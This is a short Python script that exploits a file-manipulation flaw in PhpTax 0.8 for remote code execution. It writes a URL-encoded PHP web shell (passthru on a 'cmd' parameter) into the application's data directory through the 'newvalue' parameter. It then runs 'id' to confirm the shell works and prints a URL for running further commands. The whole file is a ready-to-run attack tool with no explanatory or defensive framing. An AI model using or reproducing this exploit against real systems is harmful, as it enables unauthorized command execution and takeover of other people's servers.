import  requests
import optparse


# PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution

parser = optparse.OptionParser('Usage%Prog -u <Target url> \n '
                               'Example:\n'
                               'phptaxRCE.py -u http://192.168.31.138:8080/phptax/')
parser.add_option('-u', dest='url', type='string',help='specify target url')
(options , args) = parser.parse_args()
url = options.url

if url == None :
    print(parser.usage)
    exit(0)

shell = url + "/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E"
exp = "/data/rce.php?cmd=id"
headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0",
           "Content-Type":"text/plain"}
try:
    re = requests.get(url=shell,headers=headers)
    if re.status_code == 200 :
        res = requests.get(url=url+exp,headers=headers)
        if res.status_code == 200 and "uid=" in res.text:
            print("[+] Exploit completed successfully.")
            print(res.text)
            print("Please use this url to exec command :" + url + exp + " with Usage:Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.")


except Exception as e:
    print(e)
    print("[-] Exploit was unsuccessfully.")

